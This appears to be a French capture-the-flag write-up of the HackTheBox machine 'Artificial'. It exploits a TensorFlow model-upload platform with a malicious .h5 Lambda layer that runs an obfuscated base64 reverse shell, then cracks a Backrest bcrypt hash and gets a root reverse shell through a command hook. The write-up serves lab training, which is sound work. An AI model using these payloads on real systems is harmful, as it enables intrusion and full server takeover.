---
title: Artificial(HackTheBox) - TensorFlow RCE & Backup PrivEsc
date: 2025-10-30 01:40:29 +0000
description: Writeup complet de la machine Artificial sur HackTheBox - exploitation TensorFlow, reverse shell et escalation via Backrest.
categories: [HacktheBox]
tags: [HTB, CTFs, Hacking]
image:
    path: https://i.ibb.co/mFYqwN70/1.png
---


- **[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Vidéo

<iframe width="560" height="315" src="https://www.youtube.com/embed/7-oRUEfrlD4?si=PZQ3REPbO8PYJRW9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

## Introduction

Salut à tous ! Aujourd'hui, je vous partage mon writeup sur la machine **Artificial** de HackTheBox. C'est une box Linux classée facile, mais qui propose un vrai scénario autour de l'intelligence artificielle et des systèmes de backup. On va voir comment exploiter une plateforme web qui fait tourner des modèles TensorFlow, puis comment abuser Backrest et restic pour finir root.

---

On commence par un scan Nmap :

```bash
nmap -sV -Pn -p1-65535 --min-rate 3000 10.10.11.74 -oN artificial.nmap -v
nmap -sCV -Pn -p80 10.10.11.74
```

On trouve deux ports ouverts : SSH (22) et HTTP (80). Sur le port 80, il y a une plateforme web dédiée à l’IA, qui permet de créer, tester et déployer des modèles TensorFlow. L’interface est vraiment orientée data science, avec des options pour builder des modèles, les tester en live, et les déployer.

Un des cas d’usage mis en avant est la prédiction des ventes via l’IA. La plateforme analyse les historiques et propose des prévisions pour optimiser la stratégie commerciale.

Exemple de code pour builder un modèle :

```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])
model.compile(optimizer='adam', loss='mean_squared_error')
model.fit(X, y, epochs=100, verbose=1)
model.save('profits_model.h5')
```

On nous conseille d’utiliser TensorFlow 2.13.1 (CPU) ou leur Dockerfile pour builder le modèle dans le bon environnement :

```plaintext
# requirements.txt
tensorflow-cpu==2.13.1
```

Ou alors, on peut builder le modèle avec leur Dockerfile :

```Dockerfile
FROM python:3.8-slim
WORKDIR /code
RUN apt-get update && \
    apt-get install -y curl vim nano && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*
RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.whl
ENTRYPOINT ["/bin/bash"]
```

## Exploitation TensorFlow RCE

En cherchant un peu, je tombe sur un article qui explique comment exploiter TensorFlow via un modèle .h5 malicieux : [TensorFlow RCE using .h5](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model).

J’ai adapté l’exploit pour avoir un modèle minimal :

```python
import tensorflow as tf
import os

def exploit(x):
    os.system("printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NSAwPiYxKSAm|base64 -d|bash")
    return x

model = tf.keras.Sequential([
    tf.keras.layers.Input(shape=(1,)),
    tf.keras.layers.Lambda(exploit, name="payload"),
    tf.keras.layers.Dense(1)
])
model.compile(optimizer='adam', loss='mse')
model.save("hacked.h5")
print("Micro modèle infecté créé")
```

En uploadant ce modèle sur la plateforme, j’obtiens direct un shell en tant que l’utilisateur `app` :

```bash
$ python3 penelope.py -i tun0 -p 4445
[+] Got reverse shell from artificial~10.10.11.74-Linux-x86_64
bash-5.0$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

En fouillant, je trouve la clé Flask et la base SQLite avec les utilisateurs :

```python
app = Flask(__name__)
app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"
```

```bash
$ ls instance/
users.db
$ sqlite3 instance/users.db
sqlite> .tables
model  user
sqlite> select * from user;
# ... liste des users et hash/password ...
```

Dans `/home`, il y a deux users :

```bash
$ ls /home
app  gael
```

## Privilege Escalation

En regardant les ports, je vois qu’il y a un service qui écoute sur 9898 en local. Je fais un port forwarding SSH avec l’utilisateur `gael` :

```bash
$ ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

Je tombe sur une interface Backrest 1.7.2. En fouillant `/opt/backrest` et `/var/backups`, je trouve un backup et un fichier de config avec un hash bcrypt :

```json
{
  "name": "backrest_root",
  "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
}
```

Je décode le hash en base64 puis je le crack avec hashcat :

```bash
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > hash.txt
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Le mot de passe est `!@#$%^`.

Une fois connecté, je manipule les hooks et en cliquant sur “Backup Now”, j’obtiens un shell root :

```bash
root@artificial:/# id
uid=0(root) gid=0(root) groups=0(root)
```

On peut aussi utiliser la fonctionnalité “Run Command in repo” pour exécuter une commande et obtenir un shell :

```bash
check --password-command 'bash -c "/bin/bash -i >& /dev/tcp/10.10.14.60/4443 0>&1"'
```

## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
- [TensorFlow RCE using .h5](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)
- [Documentation Backrest](https://backrest.io/docs)
- **Love my articles?** Follow me sur [Twitter](https://x.com/@bloman19) et [Github](https://github.com/0xabdoulaye)
- [Join Us on Discord](https://discord.gg/836VBXMFdx).